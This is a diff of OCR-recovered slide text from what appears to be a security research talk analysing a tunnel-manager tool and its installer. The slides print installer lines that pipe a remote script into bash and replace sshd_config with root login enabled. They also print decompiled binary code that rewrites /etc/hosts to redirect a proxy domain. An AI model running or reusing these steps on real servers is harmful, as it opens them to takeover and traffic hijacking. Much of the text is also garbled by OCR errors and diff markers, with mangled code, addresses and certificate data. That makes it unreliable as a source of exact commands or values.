+> Recovered by OCR — confidence 89/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LET’S PLAY
 Welcome
-A user1
 Log In
 # English
 Tool’s UI — available on http://IP_ADDRESS:43237/<<Random_String>>
-~flare
 ```
 
 ## Slide 63
 
 **LET’S PLAY**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Overview
@@ -1289,7 +1159,6 @@ Server: FlareResearch ) | |Pv4
 23.85% 0% 5.77%
 RAM: 1.85 GB / 7.75 GB Swap: 0B/0B Disk: 4.42 GB / 76.45 GB
 \ Down: 463 B/s
-Uptime: Xray 2m | OS 7h
 Manage: Logs Config Backup & Restore
 Usage: RAM 22.08 MB | Threads 15
 & Out: 301.89 MB ® In: 1.01 GB
@@ -1299,7 +1168,8 @@ Usage: RAM 22.08 MB | Threads 15
 
 **LET’S PLAY**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LET’S PLAY
@@ -1312,28 +1182,25 @@ Renew User Account List Managed Users
 Lock User Account Generate Client Config
 Protocol Manager Traffic Monitor (Lite)
 DT Proxy Manager Block Torrent (Anti-P2P)
-®
 CloudFlare Free Domain Backup User Data
 SSH Banner Config Restore User Data
 Auto-Reboot Task Cleanup Expired Users
-.
 Uninstall Script @] Exit
 an option: fj
-+ flare
 ```
 
 ## Slide 65
 
 **LET’S PLAY**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LET’S PLAY
 Ubuntu 24.04.3 LTS | Uptime: 11 hours, 59 minutes
 7.95% Used | Online Sessions: @
 @ Managed Accounts | Sys Load (1m): @.28
-f | ye (Installed)
 [ 1] 4 Install DT Tunnel (Mod + Proxy)
 [ 2] Launch DT Tunnel Management Menu
 —~ Uninstall DT Tunnel (Mod + Proxy)
@@ -1345,7 +1212,8 @@ f | ye (Installed)
 
 **LET’S PLAY**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LET’S PLAY
@@ -1353,7 +1221,6 @@ DTunnel Proxy Menu
 [e1]
 [e2]
 [e3]
-[04]
 [00] e EXIT
 @ Enter your choice: 1
 @ Port: 4
@@ -1370,7 +1237,8 @@ Created symlink /etc/systemd/system/multi-user.target.wants/proxy—-4.service >
 
 **WHAT IS DTUNNEL?**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 WHAT IS DTUNNEL?
@@ -1379,27 +1247,24 @@ DTunnel
 More about this channel ...more
 Home Videos Shorts _Live Q
 CG 25 dtunnel.com.br/login
-S Shorts
 © DTUNNEL
 Total control,
 Descrigdo do uso da
 premium interface.
-permissao ...
 189 views
 Access your exclusive control panel to manage tunnels, monitor connectio Videos
 and configure integrations through an elegant and easy-to-use interface.
-o39 137 113 Bat
 DTUNNEL PROTOCOLO COM i Ativando fungao no Dtunnel - i DTunnel - GERANDO : DTUNNEL - COMO ALTERAR i TUTORIAL V2RAY DTUNNEL i DTUNNEL - IMPORTAR
 ‘SUPORTE A XHTTI Modo avido automatico APLICATIVO AS CREDENCIAIS (USER_ID) K view! years ago CONFIGURACAO,
 895 views + 3 mont! 979 views + 2 years agi
-+ flare
 ```
 
 ## Slide 68
 
 **DTUNNEL REGISTRATION**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 DTUNNEL REGISTRATION
@@ -1416,12 +1281,12 @@ Already have an account? Sign in
 
 **DTUNNEL REGISTRATION**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 DT
 D
-Sb
 Jo
 DTunnel
 Control Center
@@ -1436,7 +1301,6 @@ Devices
 Sessions
 Profile
 Active session
-G Sign out
 Renew
 Choose a plan, apply a coupon if you want, and generate the renewal payment via PIX or card.
 RENEWAL PLAN
@@ -1444,26 +1308,20 @@ Plano Mensal
 Renewal for 01 meses
 01 MESES
 FINAL AMOUNT
-R$35.00
 BASE PRICE
-RS$35.00
 APPLIED DISCOUNT
-RS$0.00
 Payment method
 $2 PIX © Card
 Choose a payment method to continue.
 Discount coupon
 Enter a discoul Apply
-© Renew now
 Available
 RENEWAL PLAN Available
 Plano Trimestral
 Renewal for 03 meses
 03 MESES
 FINAL AMOUNT
-R$90.00
 BASE PRICE
-RS90.00
 APPLIED DISCOUNT
 RS$0.00
 Payment method
@@ -1471,7 +1329,6 @@ Payment method
 Choose a payment method to continue.
 Discount coupon
 Enter a discoui Apply
-© Renew now
 RENEWAL PLAN Available
 Vitalicio
 Renewal for 2739 anos
@@ -1479,9 +1336,7 @@ Renewal for 2739 anos
 FINAL AMOUNT
 R$250.00
 BASE PRICE
-RS$250.00
 APPLIED DISCOUNT
-RS0O.00
 Payment method
 2 PIX ® Card
 Choose a payment method to continue
@@ -1493,13 +1348,9 @@ Plano Anual
 Renewal for 01 ano
 01 ANO
 FINAL AMOUNT
-R$199.90
 BASE PRICE
-RS$199.90
 APPLIED DISCOUNT
-RS0.00
 Payment method
-o2 PIX ® Card
 Choose a payment method to continue.
 Discount coupon
 Enter a discoui Apply
@@ -1509,13 +1360,6 @@ Enter a discoui Apply
 ## Slide 70
 
 **I’M FALLING IN LOVE**
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-I’M FALLING IN LOVE
-+ flare
-```
 
 ## Slide 71
 
@@ -1527,7 +1371,8 @@ I’M FALLING IN LOVE
 
 **REMEMBER THIS ONE…**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 REMEMBER THIS ONE...
@@ -1547,8 +1392,6 @@ Configuring user limiter service...
 @ Setup finished.
 Installation complete!
 Type 'menu' to start.
-root@ip-172-31-32-128:~# [J
-+ flare
 ```
 
 ## Slide 74
@@ -1557,14 +1400,13 @@ root@ip-172-31-32-128:~# [J
 
 **I know it’s too small don’t worry**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 CHECKING UNDER THE HOOD
 echo "Installing FirewallFalcon Manager..."
 # URLs (IPv4 forced to avoid GitHub IPv6 issues)
-https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon—-Manager/main/menu.sh"
-https: //raw.githubusercontent.com/firewallfalcons/FirewallFalcon—Manager/main/ssh"
 # Install menu
 wget -4 -q -0 /usr/local/bin/menu “$MENU_URL"
 chmod +x /usr/local/bin/menu
@@ -1575,7 +1417,6 @@ BACKUP="/etc/ssh/sshd_config.backup.$(date +%F-%H%M%S )"
 cp "“$SSHD_CONFIG" "$BACKUP"
 # Download FirewallFalcon SSH config
 wget —4 -q -0 "“$SSHD_CONFIG" "$SSHD_URL"
-chmod 6@@ “$SSHD_CONFIG"
 # Validate SSH config (silent)
 if ! sshd -t 2>/dev/null; then
 echo "ERROR: SSH configuration is invalid!"
@@ -1595,7 +1436,8 @@ worry
 
 **CHECKING UNDER THE HOOD**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 CHECKING UNDER THE HOOD C)
@@ -1606,7 +1448,8 @@ echo "Installing FirewallFalcon Manager..."
 
 **CHECKING UNDER THE HOOD**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 CHECKING UNDER THE HOOD C)
@@ -1618,7 +1461,8 @@ SSHD_URL="https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon—Man
 
 **CHECKING UNDER THE HOOD**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 CHECKING UNDER THE HOOD C)
@@ -1633,7 +1477,8 @@ chmod 6@@ "$SSHD_CONFIG"
 
 **CHECKING UNDER THE HOOD**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 CHECKING UNDER THE HOOD C)
@@ -1643,14 +1488,14 @@ SSHD_URL="https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon—Man
 wget -4 -q -0 "$SSHD_CONFIG" "$SSHD_URL"
 chmod 60@ "$SSHD_CONFIG"
 SSHD_CONFIG="/etc/ssh/sshd_config"
-BACKUP=""/etc/ssh/sshd_config.backup.$(date +%F—%H%M%sS ) "
 ```
 
 ## Slide 79
 
 **CHECKING UNDER THE HOOD**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 CHECKING UNDER THE HOOD
@@ -1660,7 +1505,6 @@ SSHD_URL="https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon—Man
 wget -4 -q -0 "$SSHD_CONFIG" "$SSHD_URL"
 chmod 6@@ "$SSHD_CONFIG"
 SSHD_CONFIG="/etc/ssh/sshd_config"
-BACKUP=""/etc/ssh/sshd_config.backup.$(date +%F—%H%M%sS ) "
 if ! sshd -t 2>/dev/null; then
 echo "ERROR: SSH configuration is invalid!"
 echo "Restoring previous configuration..."
@@ -1674,7 +1518,8 @@ exit 1
 
 → **"/etc/ssh/sshd_config"**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 CHECKING UNDER THE HOOD
@@ -1687,17 +1532,13 @@ KeyRegenerationInterval 3600
 ServerKeyBits 1024
 SyslogFacility AUTH
 LogLevel INFO
-[cermitrootLogin yes}
 lo yes
 RSAAuthentication yes
 PubkeyAuthentication yes
-IgnoreRhosts yes ° ll
 RhostsRSAAuthentication no > /etc/ss h/sshd config
 HostbasedAuthentication no =
 PermitEmptyPasswords no
-PermitTunnel yes
 B e bhentication no
-TForward
 Xl1DisplayOffset 10
 PrintMotd no
 PrintLastLog yes
@@ -1707,7 +1548,6 @@ AcceptEnv LANG LC_*
 Subsystem sftp /usr/lib/openssh/sftp-server
 UsePAM yes
 Banner /etc/bannerssh
-+ flare
 ```
 
 ## Slide 81
@@ -1722,15 +1562,14 @@ Banner /etc/bannerssh
 
 **REMEMBER THIS ONE…**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 REMEMBER THIS ONE...
-[ei
 [e1]
 [e2]
 [e3]
-[04]
 [00] e EXIT
 @ Enter your choice: 1
 @ Port: 4
@@ -1741,7 +1580,6 @@ REMEMBER THIS ONE...
 Created symlink /etc/systemd/system/multi-user.target.wants/proxy—-4.service > /etc/systemd/system/proxy—4.service.
 7 Proxy started on port 4.
 @ Press Enter to continue...
-+ flare
 ```
 
 ## Slide 84
@@ -1756,7 +1594,8 @@ Created symlink /etc/systemd/system/multi-user.target.wants/proxy—-4.service >
 
 **worry**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 CHECKING UNDER THE HOOD
@@ -1769,7 +1608,6 @@ echo -e “If you wish to reinstall, please uninstall it first."
 return
 fi
 echo -e "\n${C_BLUE}--- Step 1 of 2: Installing DT Tunnel Mod ---${C_RESET}"
-He
 | know it S echo "This will download and run the prerequisite mod installer."
 read -p "# Press [Enter] to continue or [Ctrl+C] to cancel."
 too sma [| if curl -sL https://raw.githubusercontent.com/firewallfalcons/ProxyMods/main/install.sh | bash; then
@@ -1798,7 +1636,8 @@ worry
 
 **CHECKING UNDER THE HOOD**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 CHECKING UNDER THE HOOD C)
@@ -1810,7 +1649,8 @@ echo -e "\n${C_GREEN}@ DT Tunnel Mod installed successfully.${C_RESET}"
 
 **CHECKING UNDER THE HOOD**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 CHECKING UNDER THE HOOD
@@ -1818,15 +1658,12 @@ CHECKING UNDER THE HOOD
 set -e
 echo "firewallfalcon" > "$HOME/.proxy_token"
 URL_X86_64="https://github.com/firewallfalcons/ProxyMods/raw/refs/heads/main/install_mod"
-URL_ARM64="https://github.com/firewallfalcons/ProxyMods/raw/refs/heads/main/Arminstall_mod"
 FILENAME="install_mod"
 echo "# Detecting your server's architecture..."
 ARCH=$(uname —m)
 case $ARCH in
 x86_64
 echo "@ Detected x86_64 (Intel/AMD 64-bit)."
-DOWNLOAD_URL=""$URL_X86_64"
-an
 aarch64
 echo "@ Detected aarch64 (ARM 64-bit)."
 DOWNLOAD_URL=""$URL_ARM64"
@@ -1841,7 +1678,8 @@ exit 1
 
 **CHECKING UNDER THE HOOD**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 CHECKING UNDER THE HOOD
@@ -1850,14 +1688,11 @@ set -e
 echo "firewallfalcon" > "$HOME/.proxy_token"
 URL_X86_6 ttps://github.com/firewallfalcons/ProxyMods/raw/refs/heads/main/install_mod"
 URL_ARM64: ttps://github.com/firewallfalcons/ProxyMods/raw/refs/heads/main/Arminstall_mod"
-FLLENAME="ifistat t_moe™
 echo "# Detecting your server's architecture..."
 ARCH=$(uname —m)
 case $ARCH in
 x86_64
 echo "@ Detected x86_64 (Intel/AMD 64-bit).
-DOWNLOAD_URL=""$URL_X86_64"
-an
 aarch64
 echo "@ Detected aarch64 (ARM 64-bit)."
 DOWNLOAD_URL=""$URL_ARM64"
@@ -1865,7 +1700,6 @@ echo Unsupported architecture: $ARCH"
 echo "This installer only supports x86_64 and aarch64."
 exit 1
 ”
-+ flare
 ```
 
 ## Slide 88
@@ -1878,7 +1712,8 @@ exit 1
 
 **I know it’s too small don’t worry**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 CHECKING UNDER THE HOOD
@@ -1886,7 +1721,6 @@ I know it’s
 too small
 don’t
 worry
-+ flare
 root@ip-172-31-32-128:~# curl -k https://proxy.dtunnel.com.br/api/v1/token/validate/firewallfalcon
 {"data":{"is_valid":true}, "status":200}
 root@ip—172-31-32-128:~# curl -vk https://proxy.dtunnel.com.br/api/v1/token/validate/firewallfalcon
@@ -1934,7 +1768,6 @@ Accept: */*
 3
 HTTP/2 200
 content-type: application/json
-content-length: 40
 date: Mon, 09 Mar 2026 23:40:47 GMT
 *
 *
@@ -1990,7 +1823,8 @@ worry
 
 **CHECKING UNDER THE HOOD (LET’S BREAK IT DOWN)**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 CHECKING UNDER THE HOOD (LET’S BREAK IT DOWN) a
@@ -1999,14 +1833,14 @@ firewallfalcon
 root@ip-172-31-32-128:~# curl -k https://proxy.dtunnel.com.br/api/v1/token/validate/firewallfalcon
 {"data":{"is_valid":true}, "status":200}
 root@ip-172-31-32-128:~# ff
-+ flare
 ```
 
 ## Slide 90
 
 **CHECKING UNDER THE HOOD (LET’S BREAK IT DOWN)**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 CHECKING UNDER THE HOOD (LET’S BREAK IT DOWN)
@@ -2023,7 +1857,6 @@ ALPN: curl offers h2,http/1.1
 *
 *
 *
-+ flare
 ```
 
 ## Slide 91
@@ -2032,14 +1865,13 @@ ALPN: curl offers h2,http/1.1
 
 89.168.51.93
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 CHECKING UNDER THE HOOD (LET’S BREAK IT DOWN) a
-§9.168.91.93
 root@ip-172-31-32-128:~# curl -vk httpse#/7proxy.dtunnel.com.br/api/v1/token/validate/firewallfalcon
 Host proxy.dtunnel.com.br:443 wasfesolved.
-IPv6: (none) >
 IPv4: 89.168.51.93 a
 Trying 89.168.51.93:443...
 Connected to proxy.dtunnel.com.br (89.168.51.93) port 443
@@ -2050,14 +1882,14 @@ ALPN: curl offers h2,http/1.1
 *
 *
 *
-+ flare
 ```
 
 ## Slide 92
 
 **DIG TO DTUNNEL FROM A CLEAN VM**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 DIG TO DTUNNEL FROM A CLEAN VM
@@ -2089,7 +1921,8 @@ ubuntu@FlareResearch:~$ ff
 
 172.67.160.230
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 DIG TO DTUNNEL FROM A CLEAN VM
@@ -2099,9 +1932,7 @@ ubuntu@FlareResearch:~$ dig proxy.dtunnel.com.br
 7; Got answer:
 3 —>>HEADER<<- opcode: QUERY, status: NOERROR, id: 56082
 i; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: @, ADDITIONAL: 1
-ee 404.94.81.498
 ; EDNS: version: @, flags:; udp: 65494 ® ® e
-'
 77 QUESTION SECTION:
 ;proxy.dtunnel.com.br. IN
 7; ANSWER SECTION:
@@ -2110,65 +1941,51 @@ proxy.dtunnel.com.br. 300 IN 172.67.160.230
 37 Query time: 39 msec
 ;; SERVER: 127.0.0.53#53(127.0.0.53) (UDP)
 7; WHEN: Mon Mar @9 23:43:12 UTC 2026
-ubuntu@FlareResearch:~$ [] e@ e@ e
-+ flare
 ```
 
 ## Slide 94
 
 **API AUTHENTICATION TO DTUNNEL FROM A CLEAN VM**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 API AUTHENTICATION TO DTUNNEL FROM A CLEAN VM a
 ubuntu@FlareResearch:~/Research/February-26/FirewallFalcon$ cat .proxy_token
 firewallfalcon
 ubuntu@FlareResearch: ~/Research/February-26/Fir 11Falcon$ curl -k https://proxy.dtunnel.c
-om-hr/ani/v1/toaken/validate/firewal
-{"data":{"error":"'ip_address'"},"status":50Q}
-+ flare
 ```
 
 ## Slide 95
 
 **API AUTHENTICATION TO DTUNNEL FROM A CLEAN VM**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 51/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 API AUTHENTICATION TO DTUNNEL FROM A CLEAN VM a
 ubuntu@FlareResearch:~/Research/February-26/FirewallFalcon$ cat .proxy_token
 firewallfalcon
 ubuntu@FlareResearch:~/Research/February-26/FirewallFalcon$ curl -k https://proxy.dtunnel.c
-om.br/ani/yt /token/validate/firemwallfalcon
 {"data":{"error":"'ip_address'"},"status":500}
 root@ip-—172-31-32-128:~# cat .proxy_token
 firewallfalcon
-SOOT OFS A1 79H 9429-190 2 th tie] ttn eS
-2=34-22-2:26+-# curd —|-attos://proxy.dtunnel.com.br/api/v1/token/validate/firewallfalcon
-{"data":{"is_ valid": true}, "status": 200}
-TOOtWip=17 2Z—31=3S 2-128. ~# a
-+ flare
 ```
 
 ## Slide 96
 
 **LET’S CHECK THE HOSTS FILE**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LET’S CHECK THE HOSTS FILE
 root@ip-172-31-32-128:~# cat /etc/hosts && echo
 127.0.@.1 localhost
 The following lines are desirable for IPv6é capable hosts
-21 ipé6-localhost ip6—-loopback
-fe0e:: ip6—localnet
-ff00::8 ipé6é—mcastprefix
-ff02::1 ipé6—allnodes
-ff02::2 ip6é—-allrouters
-ff02::3 ipé6—allhosts
 89.168.51.93 proxy.dtunnel.com.br
 root@ip-172-31-32-128:~# ff
 ```
@@ -2181,7 +1998,8 @@ root@ip-172-31-32-128:~# ff
 
 **REMEMBER THIS ONE…**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 REMEMBER THIS ONE...
@@ -2190,14 +2008,11 @@ set -e
 echo "firewallfalcon" > "$HOME/.proxy_token"
 URL_X86_6 ttps://github.com/firewallfalcons/ProxyMods/raw/refs/heads/main/install_mod"
 URL_ARM64: ttps://github.com/firewallfalcons/ProxyMods/raw/refs/heads/main/Arminstall_mod"
-FLLENAME="iftStat t_moc
 echo "# Detecting your server's architecture..."
 ARCH=$(uname —m)
 case $ARCH in
 x86_64
 echo "@ Detected x86_64 (Intel/AMD 64-bit).
-DOWNLOAD_URL=""$URL_X86_64"
-an
 aarch64
 echo "@ Detected aarch64 (ARM 64-bit)."
 DOWNLOAD_URL=""$URL_ARM64"
@@ -2212,13 +2027,13 @@ exit 1
 
 **LET’S CHECK THIS BINARY (INSTALL_MOD)**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LET’S CHECK THIS BINARY (INSTALL_MOD)
 ; DATA XREF: main_main+B4to
 ; Main_main: loc_4A7AFBrto
-+ flare
 Loc_4A7AFB: ; Name
 lea rax, aEtcHosts ; "/etc/hosts"
 mov ebx, Ah > Name
@@ -2240,51 +2055,36 @@ neg rbx
 xchg ax, ax
 cmp rbx, 22h ; ‘"'
 jb loc_4A7C41
-7
 ```
 
 ## Slide 100
 
 **LET’S CHECK THIS BINARY (INSTALL_MOD)**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LET’S CHECK THIS BINARY (INSTALL_MOD)
-+ flare
 local_49e = 0x4745422d2d2d2d2d;
 local_496._@ 8 = 0x4954524543204e49;
 pcVar2 =
-“TIFICATE—-—--\nMIIDGj CCAgKgAWIBAgIUYwt 1g+OmUz8BMRCKj QhpzQ8cr/owDQYJKoZIhvcNAQEL \nBQAwHZEdMBsGA1UE
-AwwUcHJveHkuZHR1bm5 LbC5 j b2@uYnIwHhcNMj UwOTIZMT10\nNj 11WhcNMZUWODAyMT ION j I1Wj AfMR@wGwYDVQQDDBRwcm94
-eS5kdHVubmVsLmNv\nbS5icj CCASIWDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAK81paxa0CFxjQjs\nTbosm7TKV/G4S6
-14105GA0+5023YYXp2nRhVCFqoj BJ@GQFfkiSoVKORm7 ZNLWLsB\nHOX0TJ4m7FBMtychc7NN7ob4KN7Mhn9z0qVNOiBZ4M7p5e
-83XvZ0i9ev1aPBaA8B\nDsvouXZYJE6ONV LwMo1H104hfApp lzMdh/zB7/9zJc/KGNH5+JV6wp1bj /S5gKPh\nccCM5cUv5Fzi
 MxptFP4NfcUQSj+3KSD4U40 LU+ZUJKFuj YNM7Ur3NzDyBa2 idyP6\n2CQvpIPaBcRmj bt2913QU2qW+St35VTaMGJ ruqZZgHga
-71dSxFvOFQACnbq950hA\n6BwL 2HUCAWEAAaNOMEwwKwY DVRORBCQwIOIOZHR1bm5 LbC5 j b2@uUYnKCECouZHR1\nbm5 1bC5j b2
-@uYnIWwHQYDVRO@OBBYEF) j RNwWIVVgiU8JT1SQiZ91j vt LUAMA@GCSqG\nSIb3DQEBCWUAA4 IBAQA76HWBik Lhgv0/5wt WN/17ez
-JZHUsZgj URMFY6GONQn IM2F\ n@aFHGxhhIqwY7y/yyKmrsaimkh L9@SuxkK4Q6mJto/bsGkhtDaBbqM lwaKYBhZJoD\nze/PlezG
-srQNzxf501CB+ZmTbucg@Mj pj 73SwKhF55pJ29rsDIWFB4G3zfmuov8t \ng LLNOX6UrKxUEhhiVrq0p+AgDb81YYYE/@v80zre
 @kh21PYHf35sSj do5EFHi653\nBay/Ucl82K9TpVTAQyFZ1YzYUxs4WLuutBY kwkzc jN8RZSFHQ6y j XueIgoSXVEsX\nIhFhv1
-6TITLSBK@1kQgW9PzjOZD1kgyXHdyaOvW1\n—----END CERTIFICATE---——' "
 puVar3 = (undefined8 *)(local_496 + 6);
 for (lWarl = Ox8c; lVarl != @; Warl = lWarl + -1) {
 x*puVar3 = *(undefined8 *)pcVar2;
 pcVar2 = pcVar2 + ((ulong)bVar5 * -2 + 1) * 8;
 puVar3 = puVar3 + (ulong)bVar5 * -2 + 1;
-+
 auVar6 = os.WriteFile(@x46e, 0x46e, 0x4954524543204e49, &local_49e, 0x1a4);
 return;
-}
 lWar4 = @;
 os/exec.Command(0,0,auVar6._8 8 ,0);
 Warl = os/exec. (*Cmd) .Run();
 if (Wari != 0) {
 return;
-+
 os.ReadFile();
 if (lVar4 == 0) {
-runtime. slicebytetostring();
 Warl = strings. Index(0x21);
 if (lVar1 < @) {
 os. OpenFile(0x1a4) ;
@@ -2295,80 +2095,44 @@ return;
 
 **LET’S CHECK THIS BINARY (INSTALL_MOD)**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 72/100 on the text kept, 38/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LET’S CHECK THIS BINARY (INSTALL_MOD)
-AIC) verti Z MR De LDCS | D2OUYN Twn) UOT 12M T LO) T Li cNMUWODAyMT TOR | I IW) A MRR wGeY DVOGOOE Rar
-leSSKAHY UD TL ati\ nRBS 1c ) CLAS 1WOQY JKoZ I nv CNAQEBBOAD GE PADCCAQOG QgEBAKS 1pesoCCF x )0)+\nTBoam77KYG4
-LA@SAAB+ 502 IVVIQLINAHVC Fgo | BOGOF fk 1 SOVKOGR7 ZNL eo oS\ NHBXGT JAm7F Bt wk ¢ TMNT 00400 /MBeS 2090m0 BZAPS
-B3Xv 20 1Gev LaPBaABB\ nOs vouXTY JEGENY \ wo LHI 04h f App 1 24dh /O2B7 /9.2)< /KDOS + JVEwp LD) /SgkPR\ nc CORSctwt
-tpt PRAM CUBS ) + 3KS04400 LU 2UIKF vj YNM7Ur 2NzZyBz2 idyP6\nCCOvp tPaBchm }tt 29 L3QUZ qe St ISVT AMC j rug?Ge
-71s.xF vOF GAC 80g9S0N4 \ MGB JHUC Aw MA aNOME eA YWY RORBC Qw1 0 102 ANT bes \GeS ) DI@UTVECESCUIMR \ nies L$) 0
-Ou n lWHOYDVRO@OBYEF ) ) Rite 1VVgiU8) 7150129 | ) vt LUAMARGL SqG\ nS 1B JOQEBC AAAS 1 BAQA 76HMB 1k Lngv@/Swt IN/?
-3.2003.29 )URPYOONON IMZF\ nBakiiiann Jgwy Jy /xyKmr sa Lami 1OOSUxK4Ghe) 10/S5CKMt RaBbgM lw VBRZONO\ N20 /F 2
 : auVar6 = os.WriteFile(0x46e, 0x46e, 0x4954524543204e49, &local_49e, @x1a4) ;
-puVers « (undefined® «)( . -
-Ree ties us @tee Sean 1 (auVar6._@ 8 != 0) {
 epuver} = e(undet return;
 pcVaer? = ocVar? « ({ }
-puver3 = puver3 + (wv
 U
-ouvar® = Os. Wr itet | lel @xdte, @xdbe, @x495452454 1204049, bl0ca| 490,8xle4);
-saan \var4 =U;
-lat ets os/exec.Command(0,0,auVar6._8 8 ,Q);
 at cammianame lVar1 = os/exec. (*Cmd).Run();
-a ensretete return;
 if (ivera = @) {
-runt sme. sl icetytetestring(); }
